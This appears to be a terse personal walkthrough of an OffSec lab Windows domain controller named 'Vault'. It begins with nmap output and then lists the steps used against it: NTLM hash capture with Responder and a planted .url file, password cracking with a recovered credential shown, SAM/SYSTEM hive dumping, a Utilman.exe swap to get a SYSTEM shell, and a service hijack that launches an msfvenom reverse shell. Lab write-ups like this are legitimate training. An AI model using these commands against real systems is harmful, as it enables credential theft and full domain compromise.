53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-01 06:00:00Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-08-01T06:01:32+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: VAULT
|   NetBIOS_Domain_Name: VAULT
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: vault.offsec
|   DNS_Computer_Name: DC.vault.offsec
|   DNS_Tree_Name: vault.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2026-08-01T06:00:52+00:00
| ssl-cert: Subject: commonName=DC.vault.offsec
| Issuer: commonName=DC.vault.offsec
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-31T05:54:52
| Not valid after:  2027-01-30T05:54:52
| MD5:   d0bf:33bd:0c88:f72f:c7b7:7c91:1bde:4453
|_SHA-1: 5c68:70ee:c9e4:7489:a588:0c93:da71:3608:1fda:214a
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-01T06:00:53
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

smb. sysvol and netlogon access denied
<img width="817" height="240" alt="image" src="https://github.com/user-attachments/assets/6718a0e0-3abe-4880-8c2e-0f4e4b142e5e" />
able to put files into documentsshare meants ntlm abuse
<img width="726" height="335" alt="image" src="https://github.com/user-attachments/assets/9cf18f54-9fcb-4212-b3dd-4e7203733e46" />
sudo responder -I tun0 -wv 
create evil.url file
<img width="651" height="238" alt="image" src="https://github.com/user-attachments/assets/b7bb2127-e055-4d90-8c6d-5e9860ded0f0" />
ntlm hash retrieved
<img width="1913" height="209" alt="image" src="https://github.com/user-attachments/assets/438b1acc-4a31-4e23-9dd0-c9197c391382" />
use john. anirudh:SecureHM
<img width="874" height="183" alt="image" src="https://github.com/user-attachments/assets/dced53e5-bbf7-4c85-b247-8b4b95af190f" />
logged in to smb using anirudh, went to sysvol to download all files
<img width="698" height="149" alt="image" src="https://github.com/user-attachments/assets/d202f0c8-7f7a-47a3-a8e8-fdf2e710cf96" />
kerbrute shows valid user. anirudh@vault.offsec
<img width="801" height="271" alt="image" src="https://github.com/user-attachments/assets/98e513bf-2d5f-4c18-9a7b-3f14d9a8c208" />
evilrm into anirudh
<img width="1119" height="192" alt="image" src="https://github.com/user-attachments/assets/3fa377b4-2f21-4eb4-a459-5c3c7d1a8f80" />

cmd /c "reg save HKLM\SAM SAM & reg save HKLM\SYSTEM SYSTEM"
download into attacker
use secretsdump
<img width="1904" height="261" alt="image" src="https://github.com/user-attachments/assets/36b7ee6d-ea48-44fd-aa7b-0c36eeb7d12b" />
end up USELESS

Theres 2 ways
seRestore i cldnt get serestoreabuse to work https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe?source=post_page-----158516460860--------------------------------------- 
but this works for it in someones comment that was rly cool
1. ren Utilman.exe Utilman.old
2. ren cmd.exe Utilman.exe
3. rdesktop 192.168.x.172
4. Click on that Logo on the bottom right and get a SYSTEM cmd
5. dsa.msc
6. Reset Administrator's password
7. psexec.py Administrator:'PasswordYouSet'@192.168.x.172

additionally whoami /groups. user is in server operator
upload msfvenom reverse shell
sc.exe config VMTools binPath="C:\Users\<Username>\Desktop\reverse.exe"
Start the listener and then Stop/Start the service:
sc.exe stop VMTools
sc.exe start VMTools
